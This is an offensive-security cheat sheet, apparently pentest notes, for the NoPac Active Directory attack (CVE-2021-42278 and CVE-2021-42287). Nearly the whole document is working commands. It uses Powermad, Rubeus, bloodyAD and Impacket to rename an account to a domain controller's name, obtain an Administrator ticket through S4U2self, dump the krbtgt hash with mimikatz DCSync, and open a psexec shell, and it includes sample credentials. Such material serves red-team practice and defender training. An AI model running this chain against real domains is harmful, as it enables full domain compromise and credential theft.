# 11.04 NoPac sAMAccountName Spoofing

> Chain CVE-2021-42278 + CVE-2021-42287 — rename a machine to a DC name, request TGT, revert, then S4U2Self for DCSync as Administrator.

## Overview

NoPac chains CVE-2021-42278 (unrestricted sAMAccountName changes) and CVE-2021-42287 (KDC appends $ when account not found). A controlled machine or user account is renamed to match a DC name (without $), a TGT is requested under that name, then the name is reverted and S4U2self obtains a service ticket as Administrator impersonating the DC. From Linux, bloodyAD manipulates sAMAccountName and SPN on a user account (e.g. with GenericAll), then getTGT.py + getST.py complete the chain. Results in DCSync capability.

## Steps

- Scan for vulnerability with noPac scanner (Windows: noPac.exe scan; Linux: noPac/scanner.py) — vulnerable DC returns TGT without PAC (ticket size < ~750 bytes vs ~1500 with PAC).
- Check MachineAccountQuota with (Get-DomainObject -SearchScope Base)."ms-ds-machineaccountquota" to confirm ability to add computer accounts.
- Windows: Create a machine account with Powermad New-MachineAccount, clear its SPNs, rename sAMAccountName to DC name (no $) with Set-MachineAccountAttribute, request TGT with Rubeus asktgt, revert name, then S4U2self with Rubeus.
- Linux: Use bloodyAD to clear SPN and rename sAMAccountName of a controlled user account to DC name; request TGT with getTGT.py; revert the name; run getST.py with -self -impersonate and -altservice.
- Use the final service ticket for DCSync (mimikatz lsadump::dcsync) or lateral movement (psexec.py).

## Commands

### Scan for NoPac vulnerability (Windows)

```powershell
.\noPac.exe scan -domain <DOMAIN>.local -user aneudy -pass Ilovemusic01
```

### Check MachineAccountQuota

```powershell
(Get-DomainObject -SearchScope Base)."ms-ds-machineaccountquota"
```

### Create machine account (Powermad)

```powershell
Import-Module .\Powermad.ps1; $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force; New-MachineAccount -MachineAccount "TEST01" -Password $($password) -Domain <DOMAIN>.local -DomainController 172.18.88.10 -Verbose
```

### Clear SPN of new machine account

```powershell
Set-DomainObject -Identity 'TEST01$' -Clear 'serviceprincipalname' -Domain <DOMAIN>.local -DomainController 172.18.88.10 -Verbose
```

### Rename sAMAccountName to DC name

```powershell
Set-MachineAccountAttribute -MachineAccount "TEST01" -Value "dc03" -Attribute samaccountname -Domain <DOMAIN>.local -DomainController 172.18.88.10 -Verbose
```

### Request TGT as DC name

```powershell
.\Rubeus.exe asktgt /user:dc03 /password:"Password123" /domain:<DOMAIN>.local /dc:172.18.88.10 /nowrap
```

### Revert sAMAccountName to original

```powershell
Set-MachineAccountAttribute -MachineAccount "TEST01" -Value "TEST01" -Attribute samaccountname -Domain <DOMAIN>.local -DomainController 172.18.88.10 -Verbose
```

### S4U2self for LDAP service ticket (DCSync)

```powershell
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:"ldap/dc03.<DOMAIN>.local" /dc:172.18.88.10 /ptt /ticket:doIFJDCCBSCgAwIBBa...SNIP...
```

### DCSync with mimikatz

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN>.local /kdc:dc03.<DOMAIN>.local /user:krbtgt" exit
```

### Scan for NoPac (Linux)

```bash
git clone -q https://github.com/Ridter/noPac && python3 noPac/scanner.py -dc-ip <TARGET> <DOMAIN>.local/aneudy:Ilovemusic01 -use-ldap
```

### Clear SPN on controlled user (bloodyAD Linux)

```bash
python3 bloodyAD.py -d <DOMAIN>.local -u aneudy -p Ilovemusic01 --host <TARGET> set object felipe servicePrincipalName
```

### Rename sAMAccountName to DC (bloodyAD Linux)

```bash
python3 bloodyAD.py -d <DOMAIN>.local -u aneudy -p Ilovemusic01 --host <TARGET> set object felipe sAMAccountName -v DC03
```

### Request TGT with DC name (Linux)

```bash
getTGT.py <DOMAIN>.local/dc03:Hacker0039 -dc-ip <TARGET>
```

### Revert sAMAccountName (bloodyAD Linux)

```bash
python3 bloodyAD.py -d <DOMAIN>.local -u aneudy -p Ilovemusic01 --host <TARGET> set object "CN=felipe,CN=Users,DC=<DOMAIN>,DC=local" sAMAccountName -v felipe
```

### S4U2self service ticket (Linux)

```bash
KRB5CCNAME=dc03.ccache getST.py <DOMAIN>.local/dc03 -self -impersonate 'Administrator' -altservice 'cifs/dc03.<DOMAIN>.local' -k -no-pass -dc-ip <TARGET>
```

### psexec with service ticket

```bash
KRB5CCNAME=Administrator@[email protected] psexec.py dc03.<DOMAIN>.local -k -no-pass
```
